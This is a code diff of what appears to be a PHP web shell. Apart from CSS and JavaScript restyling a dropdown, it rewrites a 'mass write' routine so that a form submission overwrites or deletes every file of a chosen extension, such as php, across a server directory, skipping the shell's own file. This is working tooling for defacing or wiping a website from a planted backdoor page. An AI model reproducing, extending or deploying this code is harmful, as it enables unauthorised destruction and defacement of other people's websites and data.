@@ -166,21 +166,8 @@ input[type=text] {
   border-top:none;
   border-left:none;
   border-right:none;
-}
-select {
-  font-family: 'Ubuntu Mono', monospace;
-  margin-left:-8px;
-  margin-right:10px;
-  margin-top:10px;
-  margin-bottom:10px;
-  padding:7px 20px;
-  outline:none;
-  border-bottom:3px solid rgba(222,222,222,0.73);
-  border-top:none;
-  border-left:none;
-  border-right:none;
-}
-a {
+
+}a {
   color: #8a8a8a;
   text-decoration:none;
 }
@@ -340,6 +327,72 @@ a.tools {
   border-radius:20px;
   border:1px solid rgba(222,222,222,0.73);
   background:rgba(222,222,222,0.73);
+}
+.custom-select {
+  position: relative;
+  font-family: 'Ubuntu Mono', monospace;
+}
+
+.custom-select select {
+  display: none; /*hide original SELECT element:*/
+}
+
+.select-selected {
+  
+}
+
+/*style the arrow inside the select element:*/
+.select-selected:after {
+  position: absolute;
+  content: "";
+  top: 20px;
+  right: 10px;
+  width: 0;
+  height: 0;
+
+}
+
+/*point the arrow upwards when the select box is open (active):*/
+.select-selected.select-arrow-active:after {
+  
+  top: 7px;
+}
+
+/*style the items (options), including the selected item:*/
+.select-items div,.select-selected {
+  color: #ffffff;
+  padding: 7px 5px;
+  border: 1px solid transparent;  
+  cursor: pointer;
+  color:#8a8a8a;
+  user-select: none;
+  outline:none;
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
+}
+
+/*style items (options):*/
+.select-items {
+  background:rgba(222,222,222,0.73);
+  color:#8a8a8a;
+  border-radius:20px;
+  top: 100%;
+  left: 0;
+  right: 0;
+  z-index: 99;
+  
+}
+
+/*hide the items when the select box is closed:*/
+.select-hide {
+  display: none;
+}
+
+.select-items div:hover, .same-as-selected {
+  background-color: rgba(0, 0, 0, 0.1);
+  border-radius:20px;
 }
 </style>
 <body>
@@ -618,33 +671,32 @@ function masswriter($post) {
         </th>
       </tr>
     </thead>
-  <?php
-  if (isset($_POST['submit'])) {
-    @masswrite($_POST['mode'], $_POST['dir'], $_POST['type'], $_POST['text']);
-  }
-  ?>
   <form method="post">
     <tr>
       <td>
-        <input style="width:98.9%;" class="form-control" type="text" name="dir" value="<?php print @cwd() ?>">
+      	<div class="custom-select">
+      		<select style="width:100%;margin-left:-8px;margin-right:10px;margin-top:10px;margin-bottom:10px;" name="mode">
+      			<option value="" selected>Choose Mode</option>
+      			<option value="1">Replace</option>
+      			<option value="2">Delete</option>
+      		</select>
+      	</div>
       </td>
     </tr>
     <tr>
       <td>
-        <select style="width:100%" name="mode" class="form-control">
-          <option>Rewrite</option>
-          <option>Apender</option>
-        </select>
+      	<input style="width:98.9%;" type="text" name="dir" value="<?php print @cwd() ?>">
+        
       </td>
     </tr>
     <tr>
       <td>
-        <input style="width:98.9%;" class="form-control" type="text" name="type" placeholder="type ext : html, php">
+        <input style="width:98.9%;" type="text" name="type" placeholder="type ext : php">
       </td>
     </tr>
     <tr>
       <td>
-        <textarea style="width:99.5%;" class="form-control" name="text"></textarea>
+        <textarea style="width:96.5%;" name="text" placeholder="if you choose mode replace please empty this"></textarea>
       </td>
     </tr>
     <tr>
@@ -652,36 +704,122 @@ function masswriter($post) {
         <input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
       </td>
     </tr>
+    <script>
+    	var x, i, j, l, ll, selElmnt, a, b, c;
+    	x = document.getElementsByClassName("custom-select");
+    	l = x.length;
+    	for (i = 0; i < l; i++) {
+    		selElmnt = x[i].getElementsByTagName("select")[0];
+    		ll = selElmnt.length;
+    		/*for each element, create a new DIV that will act as the selected item:*/
+    		a = document.createElement("DIV");
+    		a.setAttribute("class", "select-selected");
+    		a.innerHTML = selElmnt.options[selElmnt.selectedIndex].innerHTML;
+    		x[i].appendChild(a);
+    		/*for each element, create a new DIV that will contain the option list:*/
+    		b = document.createElement("DIV");
+    		b.setAttribute("class", "select-items select-hide");
+    		for (j = 1; j < ll; j++) {
+    		/*for each option in the original select element,
+    		create a new DIV that will act as an option item:*/
+    		c = document.createElement("DIV");
+    		c.innerHTML = selElmnt.options[j].innerHTML;
+    		c.addEventListener("click", function(e) {
+    		/*when an item is clicked, update the original select box,
+    		and the selected item:*/
+    		var y, i, k, s, h, sl, yl;
+    		s = this.parentNode.parentNode.getElementsByTagName("select")[0];
+    		sl = s.length;
+    		h = this.parentNode.previousSibling;
+    		for (i = 0; i < sl; i++) {
+    			if (s.options[i].innerHTML == this.innerHTML) {
+    				s.selectedIndex = i;
+    				h.innerHTML = this.innerHTML;
+    				y = this.parentNode.getElementsByClassName("same-as-selected");
+    				yl = y.length;
+    				for (k = 0; k < yl; k++) {
+    					y[k].removeAttribute("class");
+    				}
+    				this.setAttribute("class", "same-as-selected");
+    				break;
+    			}
+    		}
+    		h.click();
+    	});
+    		b.appendChild(c);
+    	}
+    	x[i].appendChild(b);
+    	a.addEventListener("click", function(e) {
+    	/*when the select box is clicked, close any other select boxes,
+    	and open/close the current select box:*/
+    	e.stopPropagation();
+      	closeAllSelect(this);
+      	this.nextSibling.classList.toggle("select-hide");
+      	this.classList.toggle("select-arrow-active");
+      });
+    } function closeAllSelect(elmnt) {
+    /*a function that will close all select boxes in the document,
+    except the current select box:*/
+    var x, y, i, xl, yl, arrNo = [];
+  	x = document.getElementsByClassName("select-items");
+  	y = document.getElementsByClassName("select-selected");
+  	xl = x.length;
+  	yl = y.length;
+  	for (i = 0; i < yl; i++) {
+  		if (elmnt == y[i]) {arrNo.push(i)
+  		} else {
+  			y[i].classList.remove("select-arrow-active");
+  		}
+  	}
+  	for (i = 0; i < xl; i++) {
+  		if (arrNo.indexOf(i)) {
+  			x[i].classList.add("select-hide");
+  		}
+  	}
+  } document.addEventListener("click", closeAllSelect);
+</script>
   </form>
   <?php
+  if (isset($_POST['submit'])) {
+    @masswrite($_POST['mode'], $_POST['dir'], $_POST['type'], $_POST['text']);
+  }
   exit();
   }
 }
 function masswrite($mode, $dir, $type, $text) {
-  switch ($mode) {
-    case 'Apender':
-      $_mode = "a";
-      break;
-    
-    case 'Rewrite':
-      $_mode = "w";
-      break;
-  }
-  if ($handle = @opendir($dir)) {
-    while (($file = @readdir($handle)) !== false) {
-      if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
-        print("<tr><td>
-          <div class='alert alert-success' role='alert'>
-          <b>".$dir.DIRECTORY_SEPARATOR."<span style='color:green;'>".$file."</span></b> Successfully !
-          </div></td></tr>");
-        $fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
-        if ($fp) {
-          @fwrite($fp, $text);
-        } else {
-          print("<tr><td>
-            <div class='alert alert-danger' role='alert'>
-            Error. Access Danied
-            <div></td></tr>");
+	if ($handle = @opendir($dir)) {
+		while (($file = @readdir($handle)) !== false) {
+			if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
+				switch ($mode) {
+					case '1':
+						$alert  = 'Rewrite';
+						$action = file_put_contents($dir.DIRECTORY_SEPARATOR.$file, $text);
+					break;
+					case '2':
+      					$alert  = 'Delete';
+      					$action = unlink($dir.DIRECTORY_SEPARATOR.$file);
+      				break;
+      			} 
+      			if ($action) {
+      				?>
+      				<tr>
+      					<td>
+      						<div class='alert alert-success' role='alert'>
+      							<?php print $dir.DIRECTORY_SEPARATOR?><b><?php print $file ?> success <?php print $alert ?> !</b>
+      						</div>
+      					</td>
+      				</tr>
+      				<?php
+      			} else {
+      				?>
+      				<tr>
+      					<td>
+      						<div class="alert alert-danger">
+      							permission danied
+      						</div>
+      					</td>
+      				</tr>
+      				<?php
         }
       }
     }
